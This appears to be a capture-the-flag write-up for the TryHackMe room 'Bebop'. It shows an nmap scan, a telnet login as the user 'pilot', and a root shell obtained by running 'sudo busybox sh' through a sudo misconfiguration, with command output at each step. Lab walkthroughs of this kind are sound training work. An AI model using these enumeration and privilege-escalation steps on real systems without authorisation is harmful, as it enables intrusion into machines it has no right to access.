# **Description**

Hello hackers, I hope you are doing well. We are doing [Bebop](https://tryhackme.com/room/bebop) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.63.34
Host is up (0.099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)

23/tcp open  telnet  BSD-derived telnetd
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

```

We found two open ports, 22/tcp running OpenSSH and 23/tcp running telnetd on FreeBSD OS.

# **Foothold**

At the first task we were given codename **pilot**, so let's try connecting to telnet using that name.

```bash
$ telnet 10.10.63.34
Trying 10.10.63.34...
Connected to 10.10.63.34.
Escape character is '^]'.

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.

                -- Dru <genesis@istar.ca>
[pilot@freebsd ~]$ 

```

Great! We got the initial shell.

# **Privilege Escalation**

Let's check out privileges with `sudo -l`.

```bash
[pilot@freebsd ~]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
```

We can run `busybox` as root.

Checking busybox on [GTFOBins](https://gtfobins.github.io/gtfobins/busybox/#sudo), we see that we can run `sudo busybox sh` and get root.

```terminal
[pilot@freebsd ~]$ sudo busybox sh
# whoami
root
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)

```

Nice, we got root.
